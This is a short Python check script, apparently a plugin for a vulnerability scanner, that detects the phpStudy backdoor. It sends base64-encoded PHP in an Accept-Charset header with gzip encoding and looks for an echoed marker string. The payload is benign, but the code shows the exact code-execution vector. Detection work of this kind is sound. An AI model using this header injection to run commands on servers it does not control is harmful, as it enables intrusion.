#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# phpstudy 后门

from lib.common import save_script_result

def do_check(self, url):
    if url == '/':
        # echo "456F5628-59FC-01C8-08BE-5CBCD4114DC3";
        poc = {
            "Accept-Charset": "ZWNobyAiNDU2RjU2MjgtNTlGQy0wMUM4LTA4QkUtNUNCQ0Q0MTE0REMzIjs=",
            "Accept-Encoding": "gzip,deflate"
        }
        status, headers, pocRequest = self.http_request('', headers=poc)
        if "456F5628-59FC-01C8-08BE-5CBCD4114DC3" in pocRequest:
            save_script_result(self, status, self.base_url, 'phpstudy back door')
